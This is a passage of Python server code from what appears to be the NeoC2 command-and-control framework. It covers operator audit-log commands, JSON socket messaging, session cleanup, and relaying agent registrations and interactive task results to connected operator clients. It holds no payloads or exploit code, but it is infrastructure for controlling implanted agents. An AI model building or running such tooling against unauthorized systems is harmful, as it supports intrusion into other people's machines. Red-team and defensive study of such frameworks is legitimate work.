                    result, status = "Audit logger not available", 'error'
                else:
                    action = 'list'  # default action
                    limit = 50  # default limit
                    offset = 0  # default offset
                    search_query = ''
                    
                    if len(command_parts) > 1:
                        action = command_parts[1].lower()
                    
                    for i, part in enumerate(command_parts[2:], 2):
                        if '=' in part:
                            key, value = part.split('=', 1)
                            if key == 'limit':
                                try:
                                    limit = int(value)
                                except ValueError:
                                    limit = 50
                            elif key == 'offset':
                                try:
                                    offset = int(value)
                                except ValueError:
                                    offset = 0
                        elif action == 'search' and i == 2:  # First non-flag argument after search is the query
                            search_query = part
                    
                    try:
                        if action == 'list':
                            logs = self.audit_logger.get_logs(limit=limit, offset=offset)
                            if logs:
                                output = f"Audit Events (limit: {limit}):\n"
                                output += "-" * 150 + "\n"
                                output += f"{'Timestamp':<25} {'Username':<20} {'Action':<20} {'Resource':<30} {'Details':<40}\n"
                                output += "-" * 150 + "\n"
                                for log in logs:
                                    timestamp = log['timestamp'][:19] if log['timestamp'] else 'N/A'
                                    username = log['username']
                                    action = log['action']
                                    resource = f"{log['resource_type']}/{log['resource_id']}"
                                    details = log['details'][:39] if log['details'] else 'N/A'

                                    # Truncate fields if too long
                                    if len(username) > 19:
                                        username = username[:17] + ".."
                                    if len(action) > 19:
                                        action = action[:17] + ".."
                                    if len(resource) > 29:
                                        resource = resource[:27] + ".."

                                    output += f"{timestamp:<25} {username:<20} {action:<20} {resource:<30} {details:<40}\n"
                                result, status = output, 'success'
                            else:
                                result, status = "No audit events found", 'info'
                        elif action == 'search':
                            if not search_query:
                                result, status = "Usage: event search <query>", 'error'
                            else:
                                logs = self.audit_logger.search_logs(query=search_query, limit=limit, offset=offset)
                                if logs:
                                    output = f"Search Results for '{search_query}' (limit: {limit}):\n"
                                    output += "-" * 100 + "\n"
                                    for log in logs:
                                        output += f"[{log['timestamp']}] {log['username']} | {log['action']} | {log['resource_type']}/{log['resource_id']}\n"
                                        output += f"  Details: {log['details']}\n"
                                        output += "-" * 100 + "\n"
                                    result, status = output, 'success'
                                else:
                                    result, status = f"No events found for search query: {search_query}", 'info'
                        elif action == 'stats':
                            stats = self.audit_logger.get_log_stats()
                            output = f"Audit Log Statistics:\n"
                            output += "-" * 50 + "\n"
                            output += f"Total Logs: {stats.get('total_logs', 0)}\n"
                            output += f"Recent (24h): {stats.get('recent_24h', 0)}\n"
                            output += f"Actions:\n"
                            for action_name, count in list(stats.get('by_action', {}).items())[:10]:  # Show top 10
                                output += f"  {action_name}: {count}\n"
                            result, status = output, 'success'
                        elif action in ['monitor', 'stop_monitor']:
                            if action == 'monitor':
                                result, status = "Real-time event monitoring: Use 'event' message type for live events. For command line, you can use 'event list' to get current events.", 'info'
                            else:
                                result, status = "Real-time event monitoring disabled.", 'info'
                        else:
                            result, status = f"Unknown event action: {action}. Use: list, search, stats, monitor, stop_monitor", 'error'
                    except Exception as e:
                        result, status = f"Error retrieving events: {str(e)}", 'error'
            else:
                result, status = self.handle_neoc2_command(command, remote_session)
            
            return {'output': result, 'status': status}
            
        except Exception as e:
            self.logger.error(f"Command execution error: {str(e)}")
            import traceback
            traceback.print_exc()
            return {'output': f"Command execution error: {str(e)}", 'status': 'error'}

    def _send_data(self, socket, data):
        try:
            json_data = json.dumps(data)
            message = json_data.encode('utf-8')
            
            length = len(message)
            socket.sendall(length.to_bytes(4, byteorder='big'))
            socket.sendall(message)
            
        except Exception as e:
            raise e

    def _receive_data(self, socket):
        try:
            length_bytes = self._receive_exact(socket, 4)
            if not length_bytes:
                return None
                
            length = int.from_bytes(length_bytes, byteorder='big')
            
            data = self._receive_exact(socket, length)
            if not data:
                return None
                
            return json.loads(data.decode('utf-8'))
            
        except Exception as e:
            raise e

    def _receive_exact(self, socket, length):
        data = b''
        while len(data) < length:
            chunk = socket.recv(length - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def _close_session(self, session_id):
        if session_id in self.active_sessions:
            session_info = self.active_sessions[session_id]
            addr = session_info['addr']
            
            if 'token' in session_info:
                token = session_info['token']
                if token in self.auth_tokens:
                    del self.auth_tokens[token]
            
            if self.multiplayer_coordinator:
                try:
                    self.multiplayer_coordinator.remove_user_session(session_id)
                except Exception as e:
                    self.logger.error(f"Error removing multiplayer session: {str(e)}")
            
            del self.active_sessions[session_id]
            
            self.logger.info(f"Client session {session_id[:8]}... from {addr} closed")

    def _ssl_files_exist(self):
        return os.path.exists(self.cert_file) and os.path.exists(self.key_file)

    def _audit_event_monitor(self):
        import time
        
        last_timestamp = datetime.now()
        event_poll_interval = 1  # Check every second
        
        while self.running:
            try:
                if self.audit_logger:

                    recent_events = self.audit_logger.get_logs(limit=10)  # Get up to 10 recent events
                    
                    for event in recent_events:
                        event_time = datetime.fromisoformat(event['timestamp'].replace('Z', '+00:00').replace('Z', ''))
                        if event_time >= last_timestamp:
                            self._broadcast_event_to_clients(event)
            
            except Exception as e:
                self.logger.error(f"Error in audit event monitor: {str(e)}")
            
            time.sleep(event_poll_interval)
    
    def _broadcast_event_to_clients(self, event):
        try:
            for session_id, socket_info in list(self.active_sessions.items()):
                session_info = socket_info
                if session_info.get('monitoring_events', False):
                    try:
                        message = {
                            'type': 'audit_event',
                            'event': event,
                            'timestamp': datetime.now().isoformat()
                        }
                        self._send_data(socket_info['socket'], message)
                    except Exception as e:
                        self.logger.error(f"Error sending event to client {session_id}: {str(e)}")
                        # Remove client if there was an error sending
                        self._close_session(session_id)
        except Exception as e:
            self.logger.error(f"Error broadcasting event to clients: {str(e)}")
    
    def _handle_event_command(self, message, session_id):
        try:
            session_info = self.active_sessions.get(session_id)
            if not session_info or not session_info.get('authenticated'):
                return {'success': False, 'error': 'Not authenticated'}
            
            # Verify token
            token = message.get('token')
            token_info = self.auth_tokens.get(token)
            if not token_info or token_info['session_id'] != session_id:
                return {'success': False, 'error': 'Invalid or expired token'}
            
            cmd_params = message.get('params', {})
            action = cmd_params.get('action', 'list')  # Default to listing events
            
            if not self.audit_logger:
                return {'success': False, 'error': 'Audit logger not available'}
            
            if action == 'list' or action == 'get':
                limit = cmd_params.get('limit', 50)
                offset = cmd_params.get('offset', 0)
                
                if limit > 1000:  # Prevent excessive data retrieval
                    limit = 100
                if limit < 1:
                    limit = 10
                if offset < 0:
                    offset = 0
                
                logs = self.audit_logger.get_logs(limit=limit, offset=offset)
                
                return {
                    'success': True,
                    'type': 'event_list',
                    'logs': logs,
                    'limit': limit,
                    'offset': offset
                }
            elif action == 'monitor':
                # Enable real-time event monitoring for this session
                session_info['monitoring_events'] = True
                self.logger.info(f"Real-time event monitoring enabled for session {session_id[:8]}")
                
                return {
                    'success': True,
                    'type': 'event_monitor',
                    'message': 'Real-time event monitoring enabled. Live events will be pushed to this session.'
                }
            elif action == 'stop_monitor':
                session_info['monitoring_events'] = False
                self.logger.info(f"Real-time event monitoring disabled for session {session_id[:8]}")
                
                return {
                    'success': True,
                    'type': 'event_monitor',
                    'message': 'Real-time event monitoring disabled.'
                }
            elif action == 'search':
                query = cmd_params.get('query', '')
                limit = cmd_params.get('limit', 50)
                offset = cmd_params.get('offset', 0)
                
                if limit > 1000:
                    limit = 100
                if limit < 1:
                    limit = 1
                if offset < 0:
                    offset = 0
                if len(query.strip()) < 2:
                    return {
                        'success': False,
                        'error': 'Query must be at least 2 characters long'
                    }
                
                logs = self.audit_logger.search_logs(query=query, limit=limit, offset=offset)
                
                return {
                    'success': True,
                    'type': 'event_search',
                    'logs': logs,
                    'limit': limit,
                    'offset': offset,
                    'query': query
                }
            elif action == 'stats':
                stats = self.audit_logger.get_log_stats()
                
                return {
                    'success': True,
                    'type': 'event_stats',
                    'stats': stats
                }
            else:
                return {
                    'success': False,
                    'error': f"Unknown event action: {action}. Use: list, monitor, stop_monitor, search, stats"
                }
                
        except Exception as e:
            self.logger.error(f"Error handling event command: {str(e)}")
            import traceback
            traceback.print_exc()
            return {'success': False, 'error': f'Event command execution error: {str(e)}'}

    def get_session_stats(self):
        active_sessions = len(self.active_sessions)
        authenticated_sessions = sum(1 for s in self.active_sessions.values() if s.get('authenticated'))
        
        return {
            'total_sessions': active_sessions,
            'authenticated_sessions': authenticated_sessions,
            'running': self.running
        }

    def acquire_interactive_lock(self, agent_id, username, session_id):
        if self.agent_manager:

            return self.agent_manager.acquire_interactive_lock(agent_id, username, session_id)
        return {'success': False, 'error': 'Agent manager not available'}

    def release_interactive_lock(self, agent_id):
        if self.agent_manager:
            return self.agent_manager.release_interactive_lock(agent_id)
        return {'success': False, 'error': 'Agent manager not available'}

    def get_interactive_lock_info(self, agent_id):
        if self.agent_manager:
            return self.agent_manager.get_interactive_lock_info(agent_id)
        return None

    def is_agent_locked_interactively(self, agent_id):
        if self.agent_manager:
            return self.agent_manager.is_agent_locked_interactively(agent_id)
        return False

    def broadcast_agent_update(self, agent_data):
        """Broadcast agent update to all connected clients"""
        # This is for new agent registrations only
        try:
            for session_id, session_info in self.active_sessions.items():
                if session_info.get('authenticated', False):
                    try:
                        message = {
                            'type': 'agent_update',
                            'agents': [agent_data],  # Single new agent
                            'timestamp': datetime.now().isoformat()
                        }

                        client_socket = session_info.get('socket')
                        if client_socket:
                            try:
                                self._send_data(client_socket, message)
                                self.logger.info(f"[+] Agent update broadcasted to CLI session {session_id[:8]} for agent {agent_data['id']}")
                            except Exception as e:
                                self.logger.error(f"[-] Failed to send agent update to CLI session {session_id[:8]}: {str(e)}")
                                self._close_session(session_id)
                        else:
                            self.logger.warning(f"[-] No socket found for session {session_id[:8]}")
                    except Exception as e:
                        self.logger.error(f"[-] Error preparing agent update for session {session_id[:8]}: {str(e)}")
        except Exception as e:
            self.logger.error(f"[-] Error broadcasting agent update: {str(e)}")

    def broadcast_all_agents_to_all_clients(self):
        """Broadcast all current agents to all connected clients periodically"""
        try:
            # Get all current agents
            if self.agent_manager:
                current_agents = self.agent_manager.list_agents()

                # Send to all connected and authenticated clients
                for session_id, session_info in self.active_sessions.items():
                    if session_info.get('authenticated', False):
                        try:
                            message = {
                                'type': 'agent_update',
                                'agents': current_agents,
                                'timestamp': datetime.now().isoformat()
                            }

                            client_socket = session_info.get('socket')
                            if client_socket:
                                try:
                                    self._send_data(client_socket, message)
                                    self.logger.debug(f"[+] All agents broadcasted to CLI session {session_id[:8]}, {len(current_agents)} agents sent")
                                except Exception as e:
                                    self.logger.error(f"[-] Failed to send agent list to CLI session {session_id[:8]}: {str(e)}")
                                    self._close_session(session_id)
                            else:
                                self.logger.warning(f"[-] No socket found for session {session_id[:8]}")
                        except Exception as e:
                            self.logger.error(f"[-] Error preparing agent list for session {session_id[:8]}: {str(e)}")
            else:
                self.logger.warning(f"[-] Agent manager not available for agent broadcast")
        except Exception as e:
            self.logger.error(f"[-] Error broadcasting all agents: {str(e)}")


    def broadcast_interactive_result(self, agent_id, task_id, result):
        try:
            for session_id, session_info in self.active_sessions.items():
                if (session_info.get('interactive_mode', False) and
                    session_info.get('current_agent') == agent_id and
                    session_info.get('authenticated', False)):

                    message = {
                        'type': 'interactive_result',
                        'result': result,
                        'agent_id': agent_id,
                        'task_id': task_id
                    }

                    client_socket = session_info.get('socket')
                    if client_socket:
                        try:
                            self._send_data(client_socket, message)
                            self.logger.info(f"[+] Interactive result broadcasted to CLI session {session_id[:8]} for agent {agent_id}")
                        except Exception as e:
                            self.logger.error(f"[-] Failed to send interactive result to CLI session {session_id[:8]}: {str(e)}")
                            self._close_session(session_id)
                    else:
                        self.logger.warning(f"[-] No socket found for session {session_id[:8]}")

                    break
            else:
                self.logger.info(f"[!] Interactive result received for agent {agent_id} but no active CLI session found")

        except Exception as e:
            self.logger.error(f"[-] Error broadcasting interactive result: {str(e)}")
